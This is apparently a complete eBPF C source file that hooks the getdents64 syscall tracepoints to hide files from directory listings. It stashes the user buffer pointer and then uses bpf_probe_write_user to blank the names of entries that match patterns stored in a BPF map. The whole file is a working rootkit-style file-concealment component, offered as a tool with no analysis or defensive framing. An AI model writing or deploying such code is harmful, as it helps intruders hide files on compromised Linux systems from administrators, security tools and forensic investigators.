/*
 * hide_files.bpf.c — eBPF program to hide files from directory listings.
 *
 * Hooks sys_exit_getdents64 to filter out directory entries whose names
 * match patterns stored in the hide_patterns map.  Supports hiding files
 * in any directory (not just /proc).
 *
 * Attach types:
 *   tracepoint/syscalls/sys_enter_getdents64
 *   tracepoint/syscalls/sys_exit_getdents64
 *
 * Maps:
 *   hide_patterns — BPF_MAP_TYPE_HASH(32): u32 key → 64-byte value (pattern)
 *   buf_stash     — BPF_MAP_TYPE_PERCPU_ARRAY(1): u32 key → u64 value (buf ptr)
 *
 * Kernel requirement: >= 4.15.
 */

#include <linux/bpf.h>
#include <linux/types.h>
#include <bpf/bpf_helpers.h>

#define MAX_PATTERNS    32
#define MAX_PATTERN_LEN 64

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_PATTERNS);
    __type(key, __u32);
    __type(value, char[MAX_PATTERN_LEN]);
} hide_patterns SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u64);
} buf_stash SEC(".maps");

struct linux_dirent64 {
    __u64  d_ino;
    __u64  d_off;
    __u16  d_reclen;
    __u8   d_type;
    char   d_name[];
};

struct sys_enter_getdents64_args {
    unsigned short common_type;
    unsigned char  common_flags;
    unsigned char  common_preempt_count;
    int            common_pid;
    int            __syscall_nr;
    unsigned int   fd;
    const struct linux_dirent64 *dirent;
    unsigned int   count;
};

struct sys_exit_getdents64_args {
    unsigned short common_type;
    unsigned char  common_flags;
    unsigned char  common_preempt_count;
    int            common_pid;
    int            __syscall_nr;
    long           ret;
};

SEC("tracepoint/syscalls/sys_enter_getdents64")
int stash_buf_ptr(struct sys_enter_getdents64_args *ctx)
{
    __u32 key = 0;
    __u64 val = (__u64)(unsigned long)ctx->dirent;
    bpf_map_update_elem(&buf_stash, &key, &val, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int filter_files(struct sys_exit_getdents64_args *ctx)
{
    if (ctx->ret <= 0)
        return 0;

    __u32 key = 0;
    __u64 *buf_ptr = bpf_map_lookup_elem(&buf_stash, &key);
    if (!buf_ptr)
        return 0;

    struct linux_dirent64 *dir = (struct linux_dirent64 *)(unsigned long)(*buf_ptr);
    int bpos = 0;
    int total = (int)ctx->ret;

    for (int i = 0; i < 512; i++) {
        if (bpos + (int)sizeof(struct linux_dirent64) > total)
            break;

        struct linux_dirent64 *cur = (void *)dir + bpos;
        __u16 reclen = 0;
        if (bpf_probe_read_user(&reclen, sizeof(reclen), &cur->d_reclen) < 0)
            break;
        if (reclen == 0)
            break;
        if (reclen > 512)
            goto next;

        char name[MAX_PATTERN_LEN] = {};
        if (bpf_probe_read_user_str(name, sizeof(name), &cur->d_name) <= 0)
            goto next;

        /* Check against all patterns. */
        for (__u32 pkey = 0; pkey < MAX_PATTERNS; pkey++) {
            char *pattern = bpf_map_lookup_elem(&hide_patterns, &pkey);
            if (!pattern)
                continue;

            /* Check if name starts with or equals the pattern. */
            int plen = 0;
            while (plen < MAX_PATTERN_LEN - 1 && pattern[plen] != '\0')
                plen++;

            if (plen == 0)
                continue;

            int match = 1;
            for (int j = 0; j < plen && j < MAX_PATTERN_LEN - 1; j++) {
                if (name[j] != pattern[j]) {
                    match = 0;
                    break;
                }
            }
            if (match) {
                char zero_name[MAX_PATTERN_LEN] = {};
                bpf_probe_write_user(&cur->d_name, 16, zero_name);
                break;
            }
        }

    next:
        bpos += reclen;
    }

    return 0;
}

char _license[] SEC("license") = "GPL";
